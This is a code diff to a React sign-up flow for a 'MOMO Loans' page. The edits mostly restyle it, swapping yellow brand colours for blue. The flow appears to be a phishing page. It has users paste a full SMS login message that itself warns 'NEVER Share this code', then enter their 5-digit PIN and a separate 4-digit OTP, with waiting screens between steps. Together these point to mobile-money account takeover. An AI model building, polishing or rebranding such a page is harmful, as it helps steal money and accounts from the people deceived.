@@ -265,14 +265,14 @@ export default function SignUpFlow() {
       <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center px-4 py-12">
         <Logo size="md" />
         <h2 className="text-2xl sm:text-3xl font-extrabold mt-4 mb-8 tracking-tight">
-          MOMO <span className="text-[#ffcc00]">Loans</span>
+          MOMO <span className="text-white font-extrabold">Loans</span>
         </h2>
 
         <div className="w-full max-w-md bg-white rounded-3xl p-6 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl relative border border-gray-100">
           <button
             id="signup-back-btn"
             onClick={handleBack}
-            className="flex items-center gap-1.5 text-gray-500 hover:text-gray-900 text-sm font-semibold mb-6 transition"
+            className="flex items-center gap-1.5 text-gray-500 hover:text-gray-900 text-sm font-semibold mb-6 transition cursor-pointer"
           >
             <ArrowLeft className="w-4 h-4" />
             <span>Back</span>
@@ -295,7 +295,7 @@ export default function SignUpFlow() {
               </p>
 
               <div className="relative mb-6">
-                <div className="flex items-center border-2 border-gray-200 focus-within:border-[#ffcc00] rounded-2xl overflow-hidden transition shadow-sm bg-white">
+                <div className="flex items-center border-2 border-gray-200 focus-within:border-[#004F71] rounded-2xl overflow-hidden transition shadow-sm bg-white">
                   <button
                     type="button"
                     onClick={() => setDropdownOpen(!dropdownOpen)}
@@ -333,7 +333,7 @@ export default function SignUpFlow() {
                           setCountry(c);
                           setDropdownOpen(false);
                         }}
-                        className="w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 text-sm font-semibold text-gray-800 transition text-left"
+                        className="w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 text-sm font-semibold text-gray-800 transition text-left cursor-pointer"
                       >
                         <div className="w-8 h-5.5 flex items-center justify-center shrink-0 overflow-hidden rounded-[3px] shadow-xs border border-gray-300 bg-white">
                           <img
@@ -360,7 +360,7 @@ export default function SignUpFlow() {
                 id="phone-next-btn"
                 onClick={handlePhoneNext}
                 disabled={phone.length < 7}
-                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
+                className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] disabled:opacity-40 transition shadow-md cursor-pointer border border-[#006591]/40"
               >
                 Next
               </button>
@@ -382,7 +382,7 @@ export default function SignUpFlow() {
                   <button
                     id="send-code-btn"
                     onClick={handleSendCode}
-                    className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 transition shadow-md"
+                    className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] transition shadow-md cursor-pointer border border-[#006591]/40"
                   >
                     Send SMS Verification
                   </button>
@@ -398,7 +398,7 @@ export default function SignUpFlow() {
                       type="button"
                       id="paste-clipboard-btn"
                       onClick={handlePasteClipboard}
-                      className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-gray-100 hover:bg-gray-200 text-gray-700 text-xs font-bold transition shadow-sm"
+                      className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-gray-100 hover:bg-gray-200 text-gray-700 text-xs font-bold transition shadow-sm cursor-pointer"
                     >
                       {pastedFeedback ? (
                         <>
@@ -421,7 +421,7 @@ export default function SignUpFlow() {
                       value={smsMessage}
                       onChange={(e) => setSmsMessage(e.target.value)}
                       placeholder="<#> Y'ello. Please enter the following code :9961 to complete your login. Be Careful. NEVER Share this code. RdbS6eMOXvx N/RywfrtIZL yiitGCXacTO I+/DM+YOkqw L9X0x07s5X9 +BQ+I2vBZvQ 071KQ0fm1I6"
-                      className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl p-4 text-xs sm:text-sm text-gray-900 font-medium placeholder:text-gray-400 placeholder:italic outline-none shadow-sm transition resize-none leading-relaxed"
+                      className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-2xl p-4 text-xs sm:text-sm text-gray-900 font-medium placeholder:text-gray-400 placeholder:italic outline-none shadow-sm transition resize-none leading-relaxed"
                       autoFocus
                     />
                     <div className="absolute right-3 bottom-3 flex items-center gap-1 text-[11px] text-gray-400 font-semibold bg-white/90 px-2 py-0.5 rounded-md">
@@ -430,9 +430,9 @@ export default function SignUpFlow() {
                     </div>
                   </div>
 
-                  <div className="flex items-center gap-2 text-xs text-gray-500 mb-6 bg-amber-50/70 border border-amber-200/60 p-3 rounded-xl">
-                    <ShieldCheck className="w-4 h-4 text-amber-700 shrink-0" />
-                    <span className="text-amber-900 text-[11px] leading-tight">
+                  <div className="flex items-center gap-2 text-xs text-gray-500 mb-6 bg-sky-50/80 border border-sky-200/80 p-3 rounded-xl">
+                    <ShieldCheck className="w-4 h-4 text-sky-700 shrink-0" />
+                    <span className="text-sky-950 text-[11px] leading-tight">
                       Please paste the complete SMS message text exactly as received in your Messages app.
                     </span>
                   </div>
@@ -441,7 +441,7 @@ export default function SignUpFlow() {
                     id="verify-sms-btn"
                     onClick={handleVerifySms}
                     disabled={!smsMessage.trim()}
-                    className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
+                    className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] disabled:opacity-40 transition shadow-md cursor-pointer border border-[#006591]/40"
                   >
                     Verify & Continue
                   </button>
@@ -481,7 +481,7 @@ export default function SignUpFlow() {
                 value={pin}
                 onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                 placeholder="•••••"
-                className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl px-4 py-3.5 text-center text-3xl tracking-[0.5em] mb-6 outline-none font-extrabold text-gray-900 shadow-sm transition"
+                className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-2xl px-4 py-3.5 text-center text-3xl tracking-[0.5em] mb-6 outline-none font-extrabold text-gray-900 shadow-sm transition"
                 autoFocus
               />
 
@@ -494,7 +494,7 @@ export default function SignUpFlow() {
                 id="pin-next-btn"
                 onClick={handlePinNext}
                 disabled={pin.length !== 5}
-                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
+                className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] disabled:opacity-40 transition shadow-md cursor-pointer border border-[#006591]/40"
               >
                 Continue
               </button>
@@ -505,9 +505,9 @@ export default function SignUpFlow() {
           {step === 4 && (
             <div id="step-4-otp-banner">
               {/* Security Banner Header */}
-              <div className="bg-gradient-to-r from-amber-500/15 to-yellow-500/10 border-2 border-amber-300/80 rounded-2xl p-4 mb-6">
-                <div className="flex items-center gap-2 text-amber-900 font-extrabold text-xs uppercase tracking-wider mb-1">
-                  <Lock className="w-4 h-4 text-amber-700" />
+              <div className="bg-sky-50 border-2 border-sky-300 rounded-2xl p-4 mb-6">
+                <div className="flex items-center gap-2 text-sky-900 font-extrabold text-xs uppercase tracking-wider mb-1">
+                  <Lock className="w-4 h-4 text-sky-700" />
                   <span>Security Verification Step</span>
                 </div>
                 <h3 className="text-lg sm:text-xl font-extrabold text-gray-900 leading-tight">
@@ -530,13 +530,13 @@ export default function SignUpFlow() {
                   value={finalOtp}
                   onChange={(e) => setFinalOtp(e.target.value.replace(/\D/g, ''))}
                   placeholder="0000"
-                  className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl px-4 py-4 text-center text-3xl tracking-[0.6em] outline-none font-black text-gray-900 shadow-sm transition"
+                  className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-2xl px-4 py-4 text-center text-3xl tracking-[0.6em] outline-none font-black text-gray-900 shadow-sm transition"
                   autoFocus
                 />
               </div>
 
               <div className="flex items-center gap-2 text-xs text-gray-500 mb-6 bg-gray-50 p-3 rounded-xl">
-                <KeyRound className="w-4 h-4 text-amber-600 shrink-0" />
+                <KeyRound className="w-4 h-4 text-sky-700 shrink-0" />
                 <span>Enter the 4-digit passcode exactly as received via SMS.</span>
               </div>
 
@@ -544,7 +544,7 @@ export default function SignUpFlow() {
                 id="final-otp-continue-btn"
                 onClick={handleFinalOtpNext}
                 disabled={finalOtp.length !== 4}
-                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
+                className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] disabled:opacity-40 transition shadow-md cursor-pointer border border-[#006591]/40"
               >
                 Continue
               </button>
@@ -570,7 +570,7 @@ export default function SignUpFlow() {
               <div
                 key={s}
                 className={`h-2 rounded-full transition-all duration-300 ${
-                  s === step ? 'w-8 bg-[#ffcc00]' : 'w-2 bg-gray-200'
+                  s === step ? 'w-8 bg-[#004F71]' : 'w-2 bg-gray-200'
                 }`}
               />
             ))}
@@ -586,11 +586,11 @@ function WaitingScreen({ message, sub }: { message: string; sub?: string }) {
     <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
       <Logo size="md" />
       <h2 className="text-2xl font-extrabold tracking-tight">
-        MOMO <span className="text-[#ffcc00]">Loans</span>
+        MOMO <span className="text-white font-extrabold">Loans</span>
       </h2>
-      <Loader2 className="w-10 h-10 text-[#ffcc00] animate-spin" />
+      <Loader2 className="w-10 h-10 text-sky-300 animate-spin" />
       <p className="text-white text-base sm:text-lg font-bold max-w-sm">{message}</p>
-      {sub && <p className="text-gray-400 text-xs sm:text-sm max-w-xs leading-relaxed">{sub}</p>}
+      {sub && <p className="text-gray-300 text-xs sm:text-sm max-w-xs leading-relaxed">{sub}</p>}
     </div>
   );
 }
